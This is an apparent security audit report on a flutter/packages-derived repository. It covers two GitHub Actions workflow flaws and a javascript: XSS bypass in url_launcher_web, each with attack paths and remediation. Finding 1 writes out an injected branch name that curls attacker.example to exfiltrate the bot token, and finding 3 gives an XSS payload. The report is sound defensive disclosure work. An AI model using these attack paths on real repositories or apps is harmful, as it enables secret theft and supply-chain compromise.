# Security vulnerability findings

Hunt date: 2026-11-16  
Repo: packages (flutter/packages lineage)  
Branch: `cursor/vulnerability-findings-persistence-d267`

## Validated findings

### 1. HIGH — GitHub Actions expression injection via branch name

- **Severity:** HIGH
- **Location:** `.github/workflows/sync_release_pr.yml`
- **Title:** Shell injection through unsanitized `github.ref_name` in `run:` script
- **Description:** The workflow triggers on push to `release-go_router-*` and interpolates `${{ github.ref_name }}` directly into a `run:` bash script (title, body, head, echo). Git allows shell metacharacters (`"`, `;`, `$()`, backticks) in ref names matching that pattern. GitHub Actions expands expressions before bash parses the script, so a crafted branch name becomes executable shell.
- **Impact:** Arbitrary command execution on the runner with `secrets.FLUTTERGITHUBBOT_TOKEN` in the environment (token theft, malicious PR creation, further repo abuse). Same push pattern also triggers the batch release workflow (see finding 2).
- **Attack path:**
  1. Attacker with permission to push branches creates a ref such as `release-go_router-x"; curl https://attacker.example/exfil?t=$FLUTTERGITHUBBOT_TOKEN; echo "` (or `$(...)` / backticks).
  2. Push the branch (even at `main` tip so commit diff is empty — the early `echo` path still interpolates `ref_name`).
  3. Workflow runs; bash executes injected commands with the bot token available.
- **Evidence:**
  - `.github/workflows/sync_release_pr.yml:7` — trigger `release-go_router-*`
  - `.github/workflows/sync_release_pr.yml:24` — `FLUTTERGITHUBBOT_TOKEN`
  - `.github/workflows/sync_release_pr.yml:34,39,45-47` — unsanitized `${{ github.ref_name }}` inside `run:`
  - Local validation: `git check-ref-format` accepts metacharacter refs; simulated post-expansion script executes injected `id` / `$(echo ...)`.
- **Remediation:** Never interpolate untrusted/`ref_name` values into `run:` script text. Pass via `env:` and quote expansions, or use `gh` with properly escaped args / a pinned action that takes inputs. Prefer an allowlist regex on branch names before any shell use. Restrict who can push `release-go_router-*` (rulesets).

### 2. HIGH — Privileged release runs attacker-controlled branch code with pub credentials

- **Severity:** HIGH
- **Location:** `.github/workflows/reusable_release.yml`
- **Title:** Release workflow checks out push-triggered branch and executes repo tooling with `PUB_CREDENTIALS`
- **Description:** `release_from_branches.yml` triggers on push to `release-go_router-*` and calls this reusable workflow with `branch-name: ${{ github.ref_name }}`. The job checks out that ref, runs composite actions and `script/tool` from the checked-out tree, and exports `PUB_CREDENTIALS` (and git user secrets) into the publish step. Any writer who can push a matching branch controls the code that runs with those secrets (when `github.repository_owner == 'flutter'`).
- **Impact:** Theft of pub.dev publish credentials / release identity; malicious package publish; supply-chain compromise of published packages.
- **Attack path:**
  1. Push `release-go_router-<anything>` containing a modified `script/tool` (or workflow composite under `.github/workflows/internals/`) that exfiltrates env secrets.
  2. `release_from_branches.yml` dispatches reusable release with that branch name.
  3. Checkout uses the malicious ref; `dart ... publish` runs with `PUB_CREDENTIALS` in the environment.
- **Evidence:**
  - `.github/workflows/release_from_branches.yml:5-14` — trigger + `branch-name: '${{ github.ref_name }}'`
  - `.github/workflows/reusable_release.yml:21-25` — checkout `ref: ${{ inputs.branch-name }}`
  - `.github/workflows/reusable_release.yml:26-30` — install Flutter / `dart pub get` from checked-out tree
  - `.github/workflows/reusable_release.yml:69-86` — publish with `PUB_CREDENTIALS`
- **Remediation:** Only checkout a known-good ref (e.g. `main`) for tooling; treat the release branch as data. Or require branch rulesets so only the release bot can create/push `release-*`. Avoid `secrets: inherit` publish unless the triggering actor/ref is explicitly trusted. Pin and verify the commit SHA that is allowed to release.

### 3. HIGH — `url_launcher_web` Link bypasses `javascript:` scheme block (XSS)

- **Severity:** HIGH
- **Location:** `packages/url_launcher/url_launcher_web/lib/src/link.dart`
- **Title:** Web `Link` sets raw `href` and allows browser navigation for `javascript:` URIs
- **Description:** `UrlLauncherPlugin.openNewWindow` / `launchUrl` explicitly reject `javascript:` (`_disallowedSchemes`, flutter/flutter#136657). The web `Link` implementation does not apply that check: `setUri` writes `uri.getHref()` (unmodified for schemed URIs) into an `<a href>`. On a normal click where `canBrowserNavigate` remains true, `_triggerLink` lets the browser navigate for external links, executing the `javascript:` URL in the app origin. Default target maps to `_self`.
- **Impact:** XSS in Flutter web apps that render `Link` with attacker-controlled URIs (user content, deep links, CMS data).
- **Attack path:**
  1. App uses `Link(uri: Uri.parse(untrusted), ...)` (or equivalent) on web.
  2. Attacker supplies `javascript:alert(document.domain)` (or data-stealing script).
  3. User clicks the link; browser follows `href` on `_self`; script runs in the app origin.
- **Evidence:**
  - `packages/url_launcher/url_launcher_web/lib/url_launcher_web.dart:23-24,71-79` — disallow list only on `openNewWindow`/`launchUrl`
  - `packages/url_launcher/url_launcher_web/lib/src/link.dart:56-60,569-575` — `getHref` / `setUri` writes schemed URI verbatim
  - `packages/url_launcher/url_launcher_web/lib/src/link.dart:533-553` — external + `canBrowserNavigate` → browser handles navigation (no scheme check)
  - `packages/url_launcher/url_launcher_web/lib/src/link.dart:587-591` — default/`self` → `_self`
- **Remediation:** Reuse `_isDisallowedScheme` (or equivalent) in `setUri` / link activation; refuse to set `href` or force `preventDefault` + blocked `launchUrl` for disallowed schemes. Add tests for `javascript:` (and other dangerous schemes) on `Link`.

## Areas reviewed — no additional HIGH/CRITICAL with complete chains

| Area | Notes |
|------|--------|
| `.github/workflows` (all 8 + composite) | `pull_request_target` in `pull_request_label.yml` / `remove_cicd.yml`: no PR checkout; API-only. Not classic pwn-request. `batch_release_pr.yml` interpolates `client_payload.package` into `run:` (unsafe pattern) but package must match a real package name to create a branch — incomplete chain with current names. |
| `script/tool` | `ProcessRunner` uses argv lists (no shell). No validated injection from untrusted CI inputs beyond workflow issues above. |
| `packages/pigeon` | Codegen escapes Dart single-quoted paths; no unsafe deser of untrusted network payloads identified. |
| `packages/go_router` | Redirect/`from` patterns are app-owned; library does not implement open redirect helpers. XSS via `state` is app rendering concern. |
| `packages/google_fonts` | HTTPS URLs + length/sha256 checks in `_isFileSecure` before load/cache. |
| `third_party/packages/flutter_svg` + `vector_graphics_compiler` | Event-based XML parse; no XXE/script execution chain validated in this pass. |
| `packages/metrics_center` | Credentials loaded from local `secret/test_gcp_credentials.json` (not in tree). |
| `packages/multicast_dns` | DNS compression pointer loop guards present. |
| Hardcoded secrets | Example Firebase `current_key` entries in `google-services.json` are client API keys (not reported as server secrets). Placeholders like `maps.key=SomeKeyHere` / `???` passwords only. No AWS/GitHub/Slack private key material found. |
| `packages/webview_flutter/*` | **NONE** for HIGH/CRITICAL with complete attacker chains. See dedicated section below. |

## webview_flutter — NONE (HIGH/CRITICAL)

Scoped hunt of `webview_flutter`, `webview_flutter_android`, `webview_flutter_wkwebview`, `webview_flutter_platform_interface`, and `webview_flutter_web`. No validated HIGH/CRITICAL finding with a complete end-to-end attack path that does not require the app developer to explicitly opt into a dangerous API or implement an insecure handler.

### Surfaces reviewed

| Surface | Result |
|---------|--------|
| Android `SecureWebChromeClient.onCreateWindow` / `window.open` | Historical UXSS (`javascript:` into parent) is covered by a regression test (`JavaScript does not run in parent window`). Implementation routes popup navigations through `WebViewClient.shouldOverrideUrlLoading` + optional Dart `onNavigationRequest`; no evidence of a working iframe→parent `javascript:` chain on current WebView. |
| Android JS defaults | Constructor enables DomStorage, `setJavaScriptCanOpenWindowsAutomatically(true)`, `setSupportMultipleWindows(true)`, but **does not** enable JavaScript until `setJavaScriptMode(unrestricted)`. |
| Android file / content access | `setAllowFileAccess` / `setAllowContentAccess` / mixed content are platform-default or explicitly opt-in. `loadFile` sets `allowFileAccess(true)` (sticky) — possible later `file://` display via popup→`loadUrl`, but no clean remote exfiltration chain (no universal-file-access settings exposed; network→file XHR/iframe blocked by Chromium). |
| Android `addJavascriptInterface` | Only `postMessage` is `@JavascriptInterface`-annotated. Channels are opt-in via `addJavaScriptChannel`. No origin/frame allowlist (platform/API limitation); no default privileged channel → not a standalone HIGH library exploit. |
| Android SSL / geo / permissions / HTTP auth | Default deny/cancel when app callbacks are unset. |
| Android Intent / custom scheme handling | No `Intent.parseUri` / `startActivity` in the Android plugin; not an intent-launch confused deputy. |
| iOS/macOS `WKUIDelegate.onCreateWebView` | Loads `target=_blank` / `window.open` into the same WebView; `decidePolicyForNavigationAction` still applies (including on the follow-up `load`). `isMainFrame: false` when `targetFrame` is null is an app-filter footgun, not a library bypass of a documented control. |
| iOS JS default | If app omits `setJavaScriptMode`, WKWebView keeps platform default (JS on), unlike Android (JS off). Inconsistency/footgun; normal apps following docs enable JS explicitly. |
| iOS JS channels / user scripts | Wrapper injected with `isForMainFrameOnly: false`; message handlers have no origin check. Same opt-in / missing-origin class as Android — not HIGH without a privileged default sink. Channel name is interpolated into a user script; new API only `assert(name.isNotEmpty)` (legacy had identifier regex) — requires attacker-controlled **channel name** via the Dart API. |
| Cookies | `getCookies` / `setCookie` are Dart-side only. Third-party cookies default false on Android API. |
| `webview_flutter_web` | Plain `HTMLIFrameElement`; no JS bridge; `loadHtmlString`/`loadRequest` are developer-supplied content. |
| Navigation delegates | Filtering is app-authored. Plugin does not claim a default URL allowlist. |

### Why candidates were not reported

- Dangerous capabilities (`runJavaScript`, `addJavaScriptChannel`, `loadFile`, `setMixedContentMode`, `setAllowFileAccess`, SSL `proceed`) are explicit app opt-ins.
- Missing JS-channel origin validation is a real design gap for apps that both register privileged bridges and embed third-party frames, but the library does not ship a privileged default bridge or bypass a documented origin control — fails the “complete chain without developer opting into the dangerous API” bar for HIGH/CRITICAL.
- The Android popup path’s “secure URL” naming is aspirational (no scheme allowlist in code); residual risk depends on Chromium navigation behavior and app `onNavigationRequest` policy, not a demonstrated library UXSS today.

## Secret name locations only (no values)

- Workflow secret **names**: `FLUTTERGITHUBBOT_TOKEN`, `PUB_CREDENTIALS`, `USER_NAME`, `USER_EMAIL`, `GITHUB_TOKEN` — under `.github/workflows/*.yml`
- Example client key field name: `current_key` in google-services.json example apps (not treated as a validated credential leak)
